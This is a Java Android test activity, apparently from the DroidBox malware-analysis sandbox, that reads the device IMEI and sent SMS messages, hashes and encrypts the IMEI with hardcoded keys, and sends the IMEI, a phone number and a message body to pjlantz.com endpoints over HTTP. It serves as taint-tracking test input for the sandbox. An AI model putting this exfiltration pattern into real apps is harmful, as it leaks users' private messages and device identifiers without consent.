package droidbox.tests;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;

public class DroidBoxTests extends Activity {
	
	private String imei, hashedImei;
	private String encryptedImei, phoneNbr, msg;
	private static final byte[] KEY = { 0, 42, 2, 54, 4, 45, 6, 7, 65, 9, 54, 11, 12, 13, 60, 15 };
	private static final byte[] KEY2 = { 0, 42, 2, 54, 4, 45, 6, 8 };
	
    /** 
     * Called when the activity is first created. 
     */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);   
        setContentView(R.layout.main);
        // Setup test variables
        this.setupTest();
        // Run tests
        this.testSMSRead();
        this.testCryptHash();
        this.testCryptAES();
        this.testCryptDES();
        this.testNetworkHTTP();
    }
    
    public void setupTest() {
    	// IMEI
        TelephonyManager manager = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
        imei = manager.getDeviceId();
    }
    
    /**
     * Read SMS history
     */
    public void testSMSRead() {
    	Log.v("Test", "[*] testSMSRead()");
    	String strUri = "content://sms/sent";
    	Uri urisms = Uri.parse(strUri);
    	Cursor c = this.getContentResolver().query(urisms, null, null, null, null);

    	while (c.moveToNext()) {
    		// Addr at column 2
    		String addr = c.getString(2);
    		phoneNbr = addr;
    		Log.v("SMSinbox", "To: " + addr);
    		// Msg body at column 11
    		msg = c.getString(11);
    		Log.v("SMSinbox", "Msg: " + msg);
    	}
    }
    
    /**
     * Usage of AES encryption in crypto API
     */
    public void testCryptAES() {
    	Log.v("Test", "[*] testCryptAES()");
    	
        Cipher c;
		try {
			c = Cipher.getInstance("AES");
	        SecretKeySpec keySpec = new SecretKeySpec(KEY, "AES");
	        c.init(Cipher.ENCRYPT_MODE, keySpec);
	        byte[] data = imei.getBytes();
	        byte[] enc = c.doFinal(data);
            encryptedImei = this.toHex(enc);
            
            Cipher d = Cipher.getInstance("AES");
            SecretKeySpec d_keySpec = new SecretKeySpec(KEY, "AES");
            d.init(Cipher.DECRYPT_MODE, d_keySpec);
            d.doFinal(enc);
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			e.printStackTrace();
		} catch (IllegalBlockSizeException e) {
			e.printStackTrace();
		} catch (BadPaddingException e) {
			e.printStackTrace();
		}
    }
    
    /**
     * Usage of DES encryption in crypto API
     */
    public void testCryptDES() {
    	Log.v("Test", "[*] testCryptDES()");
    	
        Cipher c;
		try {
			c = Cipher.getInstance("DES");
	        SecretKeySpec keySpec = new SecretKeySpec(KEY2, "DES");
	        c.init(Cipher.ENCRYPT_MODE, keySpec);
	        byte[] data = imei.getBytes();
	        byte[] enc = c.doFinal(data);
            encryptedImei = this.toHex(enc);
            
            Cipher d = Cipher.getInstance("DES");
            SecretKeySpec d_keySpec = new SecretKeySpec(KEY2, "DES");
            d.init(Cipher.DECRYPT_MODE, d_keySpec);
            d.doFinal(enc);
		} catch (NoSuchAlgorithmException e) {
			e.printStackTrace();
		} catch (NoSuchPaddingException e) {
			e.printStackTrace();
		} catch (InvalidKeyException e) {
			e.printStackTrace();
		} catch (IllegalBlockSizeException e) {
			e.printStackTrace();
		} catch (BadPaddingException e) {
			e.printStackTrace();
		}
    }
    
    /**
     * Usage of hashing in the crypto API
     */
    public void testCryptHash() {
    	Log.v("Test", "[*] testCryptHash()");
    	String testStr = "Hash me";
    	byte messageDigest[];
    	MessageDigest digest = null;
        try {
            // MD5
            digest = java.security.MessageDigest.getInstance("MD5");
            digest.update(testStr.getBytes());
            messageDigest = digest.digest();
            digest.digest(testStr.getBytes());
            
            // SHA1
            digest = java.security.MessageDigest.getInstance("SHA1");
            digest.update(testStr.getBytes());
            messageDigest = digest.digest();
            
            // Hash tainted data
            digest = null;
            digest = java.security.MessageDigest.getInstance("SHA1");
            digest.update(imei.getBytes());
            messageDigest = digest.digest();
            hashedImei = this.toHex(messageDigest);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }
    
    /**
     * Usage of HTTP connections
     */
    public void testNetworkHTTP() {
    	Log.v("Test", "[*] testNetworkHTTP()");
    	// HttpURLConnection read & write
        URL url =  null;
        HttpURLConnection urlConnection = null;
    	try {
            url = new URL("http://code.google.com/p/droidbox/");
            urlConnection = (HttpURLConnection) url.openConnection();
            BufferedReader rd = new BufferedReader(
                                new InputStreamReader(urlConnection.getInputStream()));
            @SuppressWarnings("unused")
            String line = "";
            while ((line = rd.readLine()) != null);
            
            // HttpURLConnection sending hashed tainted data
            url = new URL("http://pjlantz.com/imei.php?imei=" + hashedImei);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null);
  
            // HttpURLConnection sending encrypted tainted data
            url = new URL("http://pjlantz.com/imei.php?imei=" + encryptedImei);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null);
            
            // HttpURLConnection sending phone number retrieved from sms db
            url = new URL("http://pjlantz.com/phone.php?phone=" + phoneNbr);
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null);
            
            // HttpURLConnection sending SMS message retrieved from db
            url = new URL("http://pjlantz.com/msg.php?msg=" + msg.replace(" ", "+"));
            urlConnection = (HttpURLConnection) url.openConnection();
            rd = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while ((line = rd.readLine()) != null);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
    	    urlConnection.disconnect();
    	}
    }
    
    /**
     * Returns Hex representation of a byte buffer
     * @param buf Byte buffer
     * @return String with hex representation
     */
    private String toHex(byte[] buf) {
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < buf.length; i++) {
            String h = Integer.toHexString(0xFF & buf[i]);
            while (h.length() < 2)
                h = "0" + h;
            hexString.append(h);
        }
        return  hexString.toString();
    }
}